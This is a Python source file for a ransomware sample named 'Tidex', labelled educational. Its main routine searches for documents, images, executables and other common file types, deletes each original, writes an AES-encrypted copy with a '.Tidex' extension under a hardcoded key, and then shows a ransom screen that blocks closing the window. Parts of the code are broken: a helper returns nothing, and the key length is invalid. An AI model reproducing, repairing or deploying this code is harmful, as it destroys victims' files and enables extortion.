# This is an example of what ransomware would look like and how it behaves.
# This was created for educational purposes, any external use is not the author's problem.
import os
from importlib.resources import path
from pathlib import Path
import glob
import pyaes
import tkinter as tk

Ext = ".Tidex"
all_Ext = ["*.txt", "*.pdf", "*.exe", "*.xlsx", "*.docx", "*.xls", "*.xml", "*.cpp", "*.doc", "*.jpg", "*.png", "*.mp3"]
char = "."


def routes(dir):
    path = Path.home() / dir
    return path


def change_route():
    try:
        track = routes()
        return track
    except Exception:
        pass


def directories():
    _directory = os.listdir(routes("~/Desktop"))
    return _directory


def __dir():
    for dires in directories():
        if not os.path.isdir(dires):
            os.chdir(str(routes("~/Desktop")) + "/" + dires)
            print(os.getcwd())


def _lock():
    for files in all_Ext:
        for _dotFile in glob.glob(files):
            print(_dotFile)
            f = open(f'{__dir()}/{_dotFile}', 'rb')
            dataArr = f.read()
            f.close()
            os.remove(f'{__dir()}/{_dotFile}')
            key = "hkpykiiqftupr3okl04azj"
            aes = pyaes.AESModeOfOperationCTR(key)
            EncryptData = aes.encrypt(dataArr)
            newArr = _dotFile.replace(char, "") + Ext
            newArr = open(f'{newArr}', 'wb')
            newArr.write(EncryptData)
            newArr.close()


if __name__ == "__main__":
    _lock()
    window = tk.Tk()
    window.title("Tidex")

    label = tk.Label(window, text="██▇▇▆▆▅▅▃▃▂▂▁▁≛▁▁▂▂▃▃▄▄▅▅▆▆▇▇██\nYour files have been encrypted by [Tidex]\n\n To "
                                  "recover your "
                                  "files, enter the key \n██▇▇▆▆▅▅▃▃▂▂▁▁≛▁▁▂▂▃▃▄▄▅▅▆▆▇▇██",
                     bg='blue', bd=470, fg="white", font=("Terminal", 30))
    label.pack()
    window.resizable(False, False)


    def closeWin():
        window.destroy()


    def off():
        pass


    window.protocol("WM_DELETE_WINDOW", off)
    window.mainloop()
